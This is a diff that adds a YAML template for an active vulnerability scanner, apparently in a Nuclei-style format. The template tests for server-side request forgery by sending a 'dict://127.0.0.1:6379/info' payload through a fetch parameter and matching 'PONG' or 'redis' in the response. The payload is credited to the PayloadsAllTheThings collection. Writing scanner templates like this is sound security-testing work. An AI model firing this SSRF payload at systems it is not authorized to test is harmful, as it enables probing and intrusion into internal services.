@@ -1,0 +1,21 @@
+id: patt-ssrf-scheme-dict-01-fetch
+name: 'PATT ssrf patt-ssrf-scheme-dict-01 via fetch'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - schemedict
+description: 'PATT scheme dict://. [patt:patt-ssrf-scheme-dict-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      fetch:
+        - 'dict://127.0.0.1:6379/info'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PONG'
+          - 'redis'
